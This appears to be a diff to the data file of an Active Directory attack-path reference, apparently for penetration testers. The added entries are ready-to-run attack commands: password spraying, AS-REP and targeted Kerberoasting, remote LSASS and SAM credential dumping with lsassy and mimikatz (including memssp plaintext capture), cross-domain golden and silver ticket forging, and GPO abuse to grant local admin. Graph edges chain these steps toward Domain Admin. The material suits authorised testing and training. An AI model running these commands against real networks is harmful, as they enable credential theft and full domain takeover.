@@ -23,6 +23,17 @@ kerbrute passwordspray -d <domain> --dc <dc> users.txt 'Autumn2024!'`,
                     code: `netexec smb <subnet>/24 -u users.txt -p 'Welcome1' --continue-on-success
 netexec smb <dc> -u users.txt -p passwords.txt --continue-on-success`,
                 },
+                {
+                    label: 'Spray WinRM / hashes / local accounts',
+                    code: `netexec winrm <target> -u users.txt -p 'Autumn2024!' --continue-on-success
+netexec smb <target> -u users.txt -H <NTLM> --continue-on-success
+netexec smb <target> -u users.txt -p 'Autumn2024!' --local-auth`,
+                },
+                {
+                    label: 'Lockout policy via net accounts',
+                    code: `net accounts
+# Lockout threshold / duration / window - read before spraying`,
+                },
             ],
             tags: ['spray', 'lockout', 'kerbrute', 'netexec'],
         },
@@ -45,6 +56,11 @@ impacket-GetNPUsers <domain>/<user>:<pass> -request -dc-ip <dc>`,
                     label: 'Crack AS-REP',
                     code: `hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast`,
+                },
+                {
+                    label: 'Rubeus asreproast',
+                    code: `Rubeus.exe asreproast /nowrap /format:hashcat /outfile:asrep.txt
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt`,
                 },
             ],
             tags: ['as-rep', 'getnpusers', '18200', 'preauth'],
@@ -70,6 +86,14 @@ hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt`,
                     code: `hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 john --wordlist=/usr/share/wordlists/rockyou.txt tgs.txt`,
                 },
+                {
+                    label: 'Targeted (GenericWrite over a user)',
+                    code: `# GenericWrite/GenericAll over a user -> set an SPN, then roast it:
+impacket-targetedKerberoast -d <domain> -u <user> -p <pass> --dc-ip <dc> -v
+# or PowerView:
+Set-DomainObject -Identity <victim> -Set @{serviceprincipalname='fake/whatever'}
+Get-DomainSPNTicket -SPN 'fake/whatever' -OutputFormat Hashcat`,
+                },
             ],
             tags: ['kerberoast', 'getuserspns', 'rubeus', '13100', 'spn'],
         },
@@ -93,6 +117,18 @@ impacket-secretsdump <domain>/<user>:<pass>@<target>`,
                     label: 'SAM + LSA remotely',
                     code: `netexec smb <target> -u <user> -p <pass> --sam --lsa
 reg save HKLM\\SAM sam.save & reg save HKLM\\SYSTEM system.save & reg save HKLM\\SECURITY security.save`,
+                },
+                {
+                    label: 'lsassy (remote LSASS dump)',
+                    code: `netexec smb <target> -u <user> -p <pass> -M lsassy
+netexec smb <target> -u <user> -p <pass> -M lsassy -o PROTOCOL=smb2`,
+                },
+                {
+                    label: 'mimikatz SAM + memssp',
+                    code: `token::elevate
+lsadump::sam
+# persist plaintext creds to C:\\Windows\\System32\\mimilsa.log:
+misc::memssp`,
                 },
             ],
             tags: ['mimikatz', 'secretsdump', 'lsass', 'logonpasswords'],
@@ -188,8 +224,63 @@ impacket-psexec -k -no-pass <domain>/Administrator@<dc>`,
                     code: `kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /krbtgt:<krbtgt-ntlm> /ptt
 # then: psexec.exe \\\\<dc> cmd.exe`,
                 },
+                {
+                    label: 'Cross-domain (extra SID)',
+                    code: `# forge a TGT with the child krbtgt hash + the parent domain SID:
+impacket-ticketer -nthash <child-krbtgt-ntlm> -domain-sid <child-sid> -domain <child.domain> -extra-sid <parent-domain-sid> Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass <parent.domain>/Administrator@<parent-dc>`,
+                },
             ],
             tags: ['golden-ticket', 'ticketer', 'krbtgt', 'tgt'],
+        },
+        {
+            id: 'gpo-abuse',
+            title: 'GPO abuse (Edit Settings)',
+            type: 'technique',
+            phase: 'ad-attacks',
+            os: 'ad',
+            description:
+                'A user with Edit Settings on a GPO linked to a high-value OU (or the DC) can push a scheduled task or a local-admin entry that applies domain-wide - a quiet path to Domain Admin.',
+            commands: [
+                {
+                    label: 'Find editable GPOs',
+                    code: `Get-GPO -All | ForEach-Object { Get-GPPermission -Guid $_.Id -All } | ? {$_.Trustee -match '<user>|Everyone|Authenticated Users'}
+# or BloodHound: node -> GPO control -> linked OU`,
+                },
+                {
+                    label: 'Push an immediate task / local admin',
+                    code: `# SharpGPOAbuse: add a scheduled task that runs as SYSTEM at next refresh:
+SharpGPOAbuse.exe --AddComputerTask --TaskName Update --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c net localgroup administrators <user> /add' --GPOName '<GPO>'
+# or add yourself to local admins via GPO:
+SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName '<GPO>'
+# force refresh on the target: gpupdate /force`,
+                },
+            ],
+            tags: ['gpo', 'gppermission', 'sharpgpoabuse', 'domain-admin'],
+        },
+        {
+            id: 'silver-ticket',
+            title: 'Silver ticket',
+            type: 'technique',
+            phase: 'ad-attacks',
+            os: 'ad',
+            description:
+                'Forge a service ticket (TGS) with a service account NTLM hash from a Kerberoast crack or LSASS dump. No krbtgt needed - you become that service on one host, quieter than a golden ticket.',
+            commands: [
+                {
+                    label: 'Forge a TGS (impacket)',
+                    code: `impacket-ticketer -nthash <service-ntlm> -domain-sid <sid> -domain <domain> -spn <spn> <user>
+export KRB5CCNAME=<user>.ccache
+impacket-psexec -k -no-pass <domain>/<user>@<target>`,
+                },
+                {
+                    label: 'mimikatz silver',
+                    code: `kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /target:<target-fqdn> /service:cifs /rc4:<service-ntlm> /ptt
+# then: dir \\\\<target>\\c$`,
+                },
+            ],
+            tags: ['silver-ticket', 'tgs', 'ticketer', 'kerberoast'],
         },
     ],
     edges: [
@@ -206,6 +297,11 @@ impacket-psexec -k -no-pass <domain>/Administrator@<dc>`,
         { from: 'kerberos-clock-skew', to: 'golden-ticket', label: 'clock synced -> forge TGT' },
         { from: 'dcsync', to: 'golden-ticket', label: 'krbtgt hash -> forge' },
         { from: 'golden-ticket', to: 'domain-admin', label: 'forge Domain Admin TGT' },
+        { from: 'acl-enum', to: 'gpo-abuse', label: 'Edit Settings on a GPO' },
+        { from: 'gpo-abuse', to: 'domain-admin', label: 'GPO applies to DC / DA' },
+        { from: 'ad-dump-creds', to: 'silver-ticket', label: 'service account hash' },
+        { from: 'kerberoast', to: 'silver-ticket', label: 'cracked service hash' },
+        { from: 'silver-ticket', to: 'psexec-lateral', label: 'ticket -> exec on that host' },
     ],
 }
 
